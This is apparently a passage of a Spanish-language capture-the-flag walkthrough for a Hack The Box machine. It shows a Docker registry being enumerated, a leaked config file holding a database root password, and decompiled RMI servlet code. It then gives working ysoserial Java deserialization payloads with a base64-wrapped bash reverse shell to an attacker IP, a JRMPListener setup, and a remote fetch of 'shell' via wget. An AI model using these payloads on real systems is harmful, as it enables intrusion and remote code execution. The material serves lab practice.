      "v1Compatibility": "{\"id\":\"80e769c3cd6d9be2bcfea77a058c23d7ea112afaddce9e12c8eebf6d759923fe\",\"parent\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"created\":\"2018-01-10T09:34:07.723478629Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  EXPOSE 8080/tcp\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"f5f0aebde7367c572f72c6d19cbea5b9b039b281b5e140bcd1a9b30ebc4883ce\",\"parent\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"created\":\"2018-01-10T09:34:07.47548453Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -e \\t\\u0026\\u0026 nativeLines=\\\"$(catalina.sh configtest 2\\u003e\\u00261)\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | grep 'Apache Tomcat Native')\\\" \\t\\u0026\\u0026 nativeLines=\\\"$(echo \\\"$nativeLines\\\" | sort -u)\\\" \\t\\u0026\\u0026 if ! echo \\\"$nativeLines\\\" | grep 'INFO: Loaded APR based Apache Tomcat Native library' \\u003e\\u00262; then \\t\\techo \\u003e\\u00262 \\\"$nativeLines\\\"; \\t\\texit 1; \\tfi\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"7aa3546803b6195a9839f57454a9d61a490e5e5f921b65b7ce9883615a7fef76\",\"parent\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"created\":\"2018-01-10T09:33:57.030831358Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -eux; \\t\\tapk add --no-cache --virtual .fetch-deps \\t\\tca-certificates \\t\\topenssl \\t; \\t\\tsuccess=; \\tfor url in $TOMCAT_TGZ_URLS; do \\t\\tif wget -O tomcat.tar.gz \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\techo \\\"$TOMCAT_SHA1 *tomcat.tar.gz\\\" | sha1sum -c -; \\t\\tsuccess=; \\tfor url in $TOMCAT_ASC_URLS; do \\t\\tif wget -O tomcat.tar.gz.asc \\\"$url\\\"; then \\t\\t\\tsuccess=1; \\t\\t\\tbreak; \\t\\tfi; \\tdone; \\t[ -n \\\"$success\\\" ]; \\t\\tgpg --batch --verify tomcat.tar.gz.asc tomcat.tar.gz; \\ttar -xvf tomcat.tar.gz --strip-components=1; \\trm bin/*.bat; \\trm tomcat.tar.gz*; \\t\\tnativeBuildDir=\\\"$(mktemp -d)\\\"; \\ttar -xvf bin/tomcat-native.tar.gz -C \\\"$nativeBuildDir\\\" --strip-components=1; \\tapk add --no-cache --virtual .native-build-deps \\t\\tapr-dev \\t\\tcoreutils \\t\\tdpkg-dev dpkg \\t\\tgcc \\t\\tlibc-dev \\t\\tmake \\t\\t\\\"openjdk${JAVA_VERSION%%[-~bu]*}\\\"=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\topenssl-dev \\t; \\t( \\t\\texport CATALINA_HOME=\\\"$PWD\\\"; \\t\\tcd \\\"$nativeBuildDir/native\\\"; \\t\\tgnuArch=\\\"$(dpkg-architecture --query DEB_BUILD_GNU_TYPE)\\\"; \\t\\t./configure \\t\\t\\t--build=\\\"$gnuArch\\\" \\t\\t\\t--libdir=\\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t--prefix=\\\"$CATALINA_HOME\\\" \\t\\t\\t--with-apr=\\\"$(which apr-1-config)\\\" \\t\\t\\t--with-java-home=\\\"$(docker-java-home)\\\" \\t\\t\\t--with-ssl=yes; \\t\\tmake -j \\\"$(nproc)\\\"; \\t\\tmake install; \\t); \\trunDeps=\\\"$( \\t\\tscanelf --needed --nobanner --format '%n#p' --recursive \\\"$TOMCAT_NATIVE_LIBDIR\\\" \\t\\t\\t| tr ',' '\\\\n' \\t\\t\\t| sort -u \\t\\t\\t| awk 'system(\\\"[ -e /usr/local/lib/\\\" $1 \\\" ]\\\") == 0 { next } { print \\\"so:\\\" $1 }' \\t)\\\"; \\tapk add --virtual .tomcat-native-rundeps $runDeps; \\tapk del .fetch-deps .native-build-deps; \\trm -rf \\\"$nativeBuildDir\\\"; \\trm bin/tomcat-native.tar.gz; \\t\\tapk add --no-cache bash; \\tfind ./bin/ -name '*.sh' -exec sed -ri 's|^#!/bin/sh$|#!/usr/bin/env bash|' '{}' +\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"parent\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"created\":\"2018-01-10T09:33:33.620084689Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"parent\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"created\":\"2018-01-10T09:33:33.366948345Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"parent\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"created\":\"2018-01-10T09:33:33.130789837Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"parent\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"created\":\"2018-01-10T09:33:32.902199138Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_VERSION=9.0.2\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"parent\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"created\":\"2018-01-10T09:33:32.656603152Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_MAJOR=9\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"parent\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"created\":\"2018-01-10T09:33:29.658955433Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex; \\tfor key in $GPG_KEYS; do \\t\\tgpg --keyserver ha.pool.sks-keyservers.net --recv-keys \\\"$key\\\"; \\tdone\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"parent\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"created\":\"2018-01-10T09:33:20.722817917Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"parent\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"created\":\"2018-01-10T09:29:11.265649726Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apk add --no-cache gnupg\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"parent\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"created\":\"2018-01-10T09:29:07.609109611Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"parent\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"created\":\"2018-01-10T09:29:07.376174727Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"parent\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"created\":\"2018-01-10T09:29:07.155029096Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) WORKDIR /usr/local/tomcat\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"parent\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"created\":\"2018-01-10T09:29:06.890891119Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p \\\"$CATALINA_HOME\\\"\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"parent\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"created\":\"2018-01-10T09:29:06.087097667Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"parent\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"created\":\"2018-01-10T09:29:05.864118034Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV CATALINA_HOME=/usr/local/tomcat\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"parent\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"created\":\"2018-01-10T04:52:04.664605562Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -x \\t\\u0026\\u0026 apk add --no-cache \\t\\topenjdk8-jre=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\u0026\\u0026 [ \\\"$JAVA_HOME\\\" = \\\"$(docker-java-home)\\\" ]\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"parent\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"created\":\"2018-01-10T04:51:57.540527702Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_ALPINE_VERSION=8.151.12-r0\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"parent\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"created\":\"2018-01-10T04:51:57.314525921Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_VERSION=8u151\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"parent\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"created\":\"2018-01-10T04:51:57.072315887Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"parent\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"created\":\"2018-01-10T04:51:56.850972184Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"parent\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"created\":\"2018-01-10T04:48:25.431215554Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c { \\t\\techo '#!/bin/sh'; \\t\\techo 'set -e'; \\t\\techo; \\t\\techo 'dirname \\\"$(dirname \\\"$(readlink -f \\\"$(which javac || which java)\\\")\\\")\\\"'; \\t} \\u003e /usr/local/bin/docker-java-home \\t\\u0026\\u0026 chmod +x /usr/local/bin/docker-java-home\"]}}"
    },
    {
      "v1Compatibility": "{\"id\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"parent\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"created\":\"2018-01-10T04:48:24.510692074Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LANG=C.UTF-8\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"parent\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.579708634Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
    },
    {
      "v1Compatibility": "{\"id\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.365737589Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f in / \"]}}"
    }
  ],
  "signatures": [
    {
      "header": {
        "jwk": {
          "crv": "P-256",
          "kid": "36IA:VAB3:B6YK:ELOK:AYXC:HFKF:OQSC:COLE:FWPC:FWLQ:XOKF:MONP",
          "kty": "EC",
          "x": "GijbP5xIMJZlOkejm5_uNaEQ23Gd_YrIPYXcF4t2tfw",
          "y": "CWTlwhxixl9LyQAbAPTR1jbpIJzDZMLBY4yTagvBliI"
        },
        "alg": "ES256"
      },
      "signature": "wcuUDvZK9C2Y5YbSJEtmv9poGv3OeabltxrICZKdleRis7I46fPt7mQeLkLVcXqcxBlkmV8WXHGGziq52jBydA",
      "protected": "eyJmb3JtYXRMZW5ndGgiOjI2MDkxLCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjYtMDItMjNUMTY6NTg6NThaIn0"
    }
  ]
}
```

```bash
# El primer blob de tu lista suele ser la capa más reciente
BLOB="sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"

curl -k -L -H "Authorization: Bearer $TOKEN_REPO" \
"https://webhosting.htb:5000/v2/hosting-app/blobs/$BLOB" -o layer.tar.gz
```

```bash
# 1. Asegúrate de tener el token actualizado
TOKEN=$(curl -k -s "https://webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull" | jq -r .token)

# 2. Descarga el blob del archivo hosting.ini (el 3ro de la lista)
curl -k -L -H "Authorization: Bearer $TOKEN" \
"https://webhosting.htb:5000/v2/hosting-app/blobs/sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba" -o config_layer.tar.gz
```

```bash
s1n$ cat hosting.ini
#Mon Jan 30 21:05:01 GMT 2023
mysql.password=O8lBvQUBPU4CMbvJmYqY
rmi.host=registry.webhosting.htb
mysql.user=root
mysql.port=3306
mysql.host=localhost
domains.start-template=<body>\r\n<h1>It works\!</h1>\r\n</body>
domains.max=5
rmi.port=9002
```

```bash
# El hash que identificamos antes para el .war es 9d5bcc17...
TOKEN=$(curl -k -s "https://webhosting.htb:5001/auth?service=Docker+registry&scope=repository:hosting-app:pull" | jq -r .token)

curl -k -L -H "Authorization: Bearer $TOKEN" \
"https://webhosting.htb:5000/v2/hosting-app/blobs/sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c" -o hosting.war
```

```bash
 for hash in $(curl -k -s -H "Authorization: Bearer $TOKEN" "https://webhosting.htb:5000/v2/hosting-app/manifests/latest" | jq -r '.fsLayers[].blobSum'); do
    echo -n "$hash -> "
    curl -k -I -H "Authorization: Bearer $TOKEN" "https://webhosting.htb:5000/v2/hosting-app/blobs/$hash" 2>/dev/null | grep -i Content-Length
done
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:0bf45c325a696381eea5176baa1c8e84fbf0fe5e2ddf96a22422b10bf879d0ba -> content-length: 323
sha256:4a19a05f49c2d93e67d7c9ea8ba6c310d6b358e811c8ae37787f21b9ad82ac42 -> content-length: 33531617
sha256:9e700b74cc5b6f81ed6513fa03c7b6ab11a71deb8e27604632f723f81aca3268 -> content-length: 1279
sha256:b5ac54f57d23fa33610cb14f7c21c71aa810e58884090cead5e3119774a202dc -> content-length: 544
sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7 -> content-length: 23521733
sha256:9d5bcc17fed815c4060b373b2a8595687502925829359dc244dd4cdff777a96c -> content-length: 1035
sha256:ab55eca3206e27506f679b41b39ba0e4c98996fa347326b6629dae9163b4c0ec -> content-length: 207
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:f7b708f947c32709ecceaffd85287d5eb9916a3013f49c8416228ef22c2bf85e -> 	content-length: 132
sha256:497760bf469e19f1845b7f1da9cfe7e053beb57d4908fb2dff2a01a9f82211f9 -> content-length: 12451423
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:e4cc5f625cda9caa32eddae6ac29b170c8dc1102988b845d7ab637938f2f6f84 -> content-length: 98146
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:0da484dfb0612bb168b7258b27e745d0febf56d22b8f10f459ed0d1dfe345110 -> content-length: 6068203
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:7b43ca85cb2c7ccc62e03067862d35091ee30ce83e7fed9e135b1ef1c6e2e71b -> content-length: 138
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:fa7536dd895ade2421a9a0fcf6e16485323f9e2e45e917b1ff18b0f648974626 -> content-length: 54453948
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:5de5f69f42d765af6ffb6753242b18dd4a33602ad7d76df52064833e5c527cb4 -> content-length: 238
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4 -> content-length: 32
sha256:ff3a5c916c92643ff77519ffa742d3ec61b7f591b6b7504599d95a4a41134e28 -> content-length: 2065537
```


```bash
# 1. Descarga el blob pesado
curl -k -L -H "Authorization: Bearer $TOKEN" \
"https://webhosting.htb:5000/v2/hosting-app/blobs/sha256:396c4a40448860471ae66f68c261b9a0ed277822b197730ba89cb50528f042c7" \
-o app_full.tar.gz

# 2. Busca el archivo hosting.war dentro
tar -ztvf app_full.tar.gz | grep hosting.war

tar -zxvf app_full.tar.gz usr/local/tomcat/webapps/hosting.war
usr/local/tomcat/webapps/hosting.war
```

fileService.class

```java
package WEB-INF.classes.com.htb.hosting.rmi;

import com.htb.hosting.rmi.AbstractFile;
import java.io.IOException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.util.List;

public interface FileService extends Remote {
  List<AbstractFile> list(String paramString1, String paramString2) throws RemoteException;
  
  boolean uploadFile(String paramString1, String paramString2, byte[] paramArrayOfbyte) throws IOException;
  
  boolean delete(String paramString) throws RemoteException;
  
  boolean createDirectory(String paramString1, String paramString2) throws RemoteException;
  
  byte[] view(String paramString1, String paramString2) throws IOException;
  
  AbstractFile getFile(String paramString1, String paramString2) throws RemoteException;
  
  AbstractFile getFile(String paramString) throws RemoteException;
  
  void deleteDomain(String paramString) throws RemoteException;
  
  boolean newDomain(String paramString) throws RemoteException;
  
  byte[] view(String paramString) throws RemoteException;
}
```


rmicleintwrapper.class

```java
package WEB-INF.classes.com.htb.hosting.rmi;

import com.htb.hosting.rmi.FileService;
import com.htb.hosting.utils.config.Settings;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.logging.Logger;

public class RMIClientWrapper {
  private static final Logger log = Logger.getLogger(com.htb.hosting.rmi.RMIClientWrapper.class.getSimpleName());
  
  public static FileService get() {
    try {
      String rmiHost = (String)Settings.get(String.class, "rmi.host", null);
      if (!rmiHost.contains(".htb"))
        rmiHost = "registry.webhosting.htb"; 
      System.setProperty("java.rmi.server.hostname", rmiHost);
      System.setProperty("com.sun.management.jmxremote.rmi.port", "9002");
      log.info(String.format("Connecting to %s:%d", new Object[] { rmiHost, Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999)) }));
      Registry registry = LocateRegistry.getRegistry(rmiHost, ((Integer)Settings.get(Integer.class, "rmi.port", Integer.valueOf(9999))).intValue());
      return (FileService)registry.lookup("FileService");
    } catch (Exception e) {
      e.printStackTrace();
      throw new RuntimeException(e);
    } 
  }
}
```

![image-center](/assets/images/Pasted image 20260223142639.png)

```bash
package WEB-INF.classes.com.htb.hosting.services;

import com.htb.hosting.services.AbstractServlet;
import com.htb.hosting.utils.config.Settings;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(name = "reconfigure", value = {"/reconfigure"})
public class ConfigurationServlet extends AbstractServlet {
  private static final long serialVersionUID = -2336661269816738483L;
  
  public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    if (!checkManager(request, response))
      return; 
    RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");
    rd.include((ServletRequest)request, (ServletResponse)response);
  }
  
  public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
    if (!checkManager(request, response))
      return; 
    Map<String, String> parameterMap = new HashMap<>();
    request.getParameterMap().forEach((k, v) -> parameterMap.put(k, v[0]));
    Settings.updateBy(parameterMap);
    RequestDispatcher rd = request.getRequestDispatcher("/WEB-INF/jsp/configuration.jsp");
    request.setAttribute("message", "Settings updated");
    rd.include((ServletRequest)request, (ServletResponse)response);
  }
  
  private static boolean checkManager(HttpServletRequest request, HttpServletResponse response) throws IOException {
    boolean isManager = (request.getSession().getAttribute("s_IsLoggedInUserRoleManager") != null);
    if (!isManager)
      response.sendRedirect(request.getContextPath() + "/panel"); 
    return isManager;
  }
  
  public void destroy() {}
}
```

![image-center](/assets/images/Pasted image 20260223143438.png)

![image-center](/assets/images/Pasted image 20260223143516.png)

![image-center](/assets/images/Pasted image 20260223143522.png)

```bash
java --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     -jar ysoserial-all.jar CommonsCollections6 \
     "bash -c {echo,$(echo -n 'bash -i >& /dev/tcp/10.10.17.19/9001 0>&1' | base64)}|{base64,-d}|{bash,-i}" \
     > payload.ser
```

```bash
java --add-opens java.base/java.util=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 9001 CommonsCollections6 \
     'bash -i >& /dev/tcp/10.10.17.19/9001 0>&1'
* Opening JRMP listener on 9001
```

```bash
 git clone https://github.com/heyder/ysoserial-modified
Cloning into 'ysoserial-modified'...
remote: Enumerating objects: 333, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 333 (delta 3), reused 7 (delta 3), pack-reused 324 (from 1)
Receiving objects: 100% (333/333), 84.22 MiB | 24.93 MiB/s, done.
Resolving deltas: 100% (97/97), done.

┌──(root㉿kali)-[/home/zsln/Desktop/zsln/RegistryTwo]
└─# cd ysoserial-modified
```

```bash
docker run --rm -v "$PWD/docker-entrypoint-initdb.d:/docker-entrypoint-initdb.d" -e MYSQL_DATABASE=hosting -e MYSQL_ROOT_PASSWORD=O8lBvQUBPU4CMbvJmYqY -p 3306:3306 -it mysql
```

```bash
zs1n$ java -jar rmg.jar listen --yso ysoserial-all.jar 10.10.17.19 9002 CommonsCollections6 "wget 10.10.17.19/shell"
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 10.10.17.19:9002.
[+] Handing off to ysoserial...
Have connection from /10.129.229.28:42740
Reading message...
Sending return with payload for obj [0:0:0, 0]
Closing connection
```

```bash
zs1n$ www
[eth0] 192.168.100.8
[br-427beff723d7] 172.18.0.1
[docker0] 172.17.0.1
[tun0] 10.10.17.19
